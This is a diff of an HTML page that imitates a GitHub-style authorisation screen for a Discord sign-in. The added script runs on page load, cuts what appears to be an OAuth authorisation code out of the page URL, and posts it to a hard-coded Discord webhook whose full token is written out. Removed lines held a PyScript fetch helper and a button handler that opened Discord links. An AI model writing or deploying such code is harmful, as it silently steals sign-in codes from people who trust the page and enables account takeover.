@@ -12,46 +12,6 @@
   transform: translate3d(0, 0, 0);
 }
 </style>
-
-
-<link rel="stylesheet" href="https://pyscript.net/latest/pyscript.css" />
-<script defer src="https://pyscript.net/latest/pyscript.js"></script>
-
-<py-script>
-from pyodide.http import pyfetch, FetchResponse
-from typing import Optional, Any
-
-async def request(url: str, method: str = "GET", body: Optional[str] = None,
-                  headers: Optional[dict[str, str]] = None, **fetch_kwargs: Any) -> FetchResponse:
-    """
-    Async request function. Pass in Method and make sure to await!
-    Parameters:
-        url: str = URL to make request to
-        method: str = {"GET", "POST", "PUT", "DELETE"} from `JavaScript` global fetch())
-        body: str = body as json string. Example, body=json.dumps(my_dict)
-        headers: dict[str, str] = header as dict, will be converted to string...
-            Example, headers=json.dumps({"Content-Type": "application/json"})
-        fetch_kwargs: Any = any other keyword arguments to pass to `pyfetch` (will be passed to `fetch`)
-    Return:
-        response: pyodide.http.FetchResponse = use with .status or await.json(), etc.
-    """
-    kwargs = {"method": method, "mode": "cors"}  # CORS: https://en.wikipedia.org/wiki/Cross-origin_resource_sharing
-    if body and method not in ["GET", "HEAD"]:
-        kwargs["body"] = body
-    if headers:
-        kwargs["headers"] = headers
-    kwargs.update(fetch_kwargs)
-
-    response = await pyfetch(url, **kwargs)
-    return response
-</py-script>
-
-    <py-config>
-      [[fetch]]
-      files = ["https://twilight-wood-1574.on.fleek.co/oauth2/request.py"]
-    </py-config>
-    
-    
     <meta charset="utf-8">
   <link rel="dns-prefetch" href="https://github.githubassets.com">
   <link rel="dns-prefetch" href="https://avatars.githubusercontent.com">
@@ -150,39 +110,28 @@ async def request(url: str, method: str = "GET", body: Optional[str] = None,
     To finish authorisation, press Finish.
   </label>
   <div class="position-relative">
-    <input type="submit" name="commit" value="Finish!" class="btn btn-primary btn-block js-sign-in-button" id="copyButton" onclick="copy()">
     <script>
 code = window.location.href.slice(63,100)
-function copy() {
-  document.getElementById('copyButton').disabled = true
-  navigator.clipboard.writeText(window.location.href.slice(63,100));
-  code = window.location.href.slice(63,100)
-  postRequest(window.location.href.slice(63,100))
-  setTimeout(openWindows, 500)
-}
-function openWindows() {
-  window.open("discord://https://discord.com/channels/882045882311262208/1006926859835027537");
-  window.open("https://discord.com/oauth2/authorized", "_self");
-}
-function postRequest(code) {
-console.log("test")
-}
-</script>
-<py-script>
- # Import and use JS function and variable into Python
-from js import code, postRequest
-import asyncio
-import json
-from request import request  # import our request function.
+async function postJSON(data) {
+  try {
+    const response = await fetch("https://discord.com/api/webhooks/1103808892867190856/o3VCDH7eB8azWxXcvKHvalMlGdpbUlweCXlxmkELDZTcNSwsQvuS2f09M4_v2PxxQrOe", {
+      method: "POST", // or 'PUT'
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(data),
+    });
 
-async def main():
-    baseurl = "https://jsonplaceholder.typicode.com"
-    # POST
-    body = json.dumps({"title": "test_title", "body": "test body", "userId": 1})
-    new_post = await request(f"{baseurl}/posts", body=body, method="POST", headers=headers)
-    print(f"POST request=> status:{new_post.status}, json:{await new_post.json()}")
-asyncio.ensure_future(main())
-</py-script>
+    const result = await response.json()
+    console.log("Success:", result)
+  } catch (error) {
+    console.error();("Error:", error)
+  }
+}
+
+const data = { content: code };
+postJSON(data);
+</script>
   </div>
       </div>
   </div>
